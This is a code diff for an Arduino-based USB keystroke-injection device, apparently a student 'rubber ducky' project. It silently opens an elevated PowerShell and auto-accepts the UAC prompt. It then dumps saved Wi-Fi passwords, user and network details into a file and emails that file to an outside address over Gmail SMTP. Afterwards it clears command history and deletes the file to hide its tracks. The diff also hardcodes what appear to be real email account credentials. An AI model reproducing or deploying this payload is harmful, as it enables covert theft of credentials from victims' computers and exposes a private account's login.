@@ -80,58 +80,44 @@ void setup()
     // Begining the Keyboard stream
     Keyboard.begin();
     delay(2000);
-  
-    openWindowsMenu();
+
+    twoKeyCombination(KEY_LEFT_GUI,'r');  // open "run" dialog
+
+    command("powershell Start-Process powershell -Verb runAs");
     
-    Keyboard.print("cmd");
-    delay(1000);  // wait for the search to find cmd
-  
-    threeKeyCombination(KEY_LEFT_CTRL,KEY_LEFT_SHIFT,KEY_RETURN);  // used to select and open cmd as an administrator
-    
-    delay(4000);  // wait for the cmd to open
+    delay(1500);  // wait for the powershell to open
 
     Keyboard.press(KEY_LEFT_ALT);  // reply yes to User Account Control Screen
     Keyboard.press('y');
     Keyboard.releaseAll();
     delay(300);
+    typeKey(KEY_RETURN);
+    delay(2000);  // wait untill the system recognises y is not a command, or until powershell opens
 
-    moveWindowOffScreen();
-    
-    command("powershell");
-    delay(10000);  // wait to painfully load the powershell
+    //moveWindowOffScreen();
+
     command("$SMTPServer = 'smtp.gmail.com'");
     command("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");
     command("$SMTPInfo.EnableSsl = $true");
     command("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('nickpap556', 'cB12c39#ni55billNiK');");
-    command("clear");  //to make sure no one sees the credentials above
     command("$ReportEmail = New-Object System.Net.Mail.MailMessage");
     command("$ReportEmail.From = 'nickpap556@gmail.com'");
     command("$ReportEmail.To.Add('aellinitakis@isc.tuc.gr')");
     command("clear");
+    twoKeyCombination(KEY_LEFT_ALT,KEY_F7);  // cmd and powershell history(commands) is erased with Alt+F7
     command("$ReportEmail.Subject = 'Duck Machine Report'");
     command("$ReportEmail.Body = 'Duck Email Successfully Sent from Rubber-Duckied PC!Check the attachments for system data/info.'");
     command("echo \"This is a file automatically generated on the target pc by the ducky script.\" > reportfile.txt");              // signle > because we do not want to append, we want to create the file
     command("echo \"whoami results:\" >> reportfile.txt");          
     command("whoami >> reportfile.txt");                        
-    command("echo \"WIFI PASSWORDS!\" >> reportfile.txt");      
-    command("clear");     
-    command("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> reportfile.txt");                         typeKey(KEY_RETURN);
+    command("echo \"WIFI PASSWORDS!\" >> reportfile.txt");       
+    command("(netsh wlan show profiles) | Select-String \"\\:(.+)$\" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=\"$name\" key=clear)}  | Select-String \"Key Content\\W+\\:(.+)$\" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize >> reportfile.txt");                     
     //THE ABOVE ONE-LINER was found on https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---Data-Exfiltration---Backdoor
-    delay(10000);  // wait for the above command to execute.Usually takes a long time.
     command("echo \"ipconfig results\" >> reportfile.txt");         
     command("ipconfig >> reportfile.txt");                       
-    delay(1500);
     command("$ReportEmail.Attachments.Add('reportfile.txt')");   // dump every useful info in that file and attach it to the email 
-    command("clear");
     command("$SMTPInfo.Send($ReportEmail)");
-    delay(10000);  // wait for the email to be sent
-    
-    twoKeyCombination(KEY_LEFT_ALT,KEY_F7);  // cmd and powershell history(commands) is erased with Alt+F7
-    
-    command("exit");
-    delay(1000);  // wait for the powershell to exit
     command("del reportfile.txt");  // hide our tracks a bit, after powershell has exited -> email has been sent(can cause trouble)
-    delay(300);
     command("exit");
     Keyboard.end();
   }
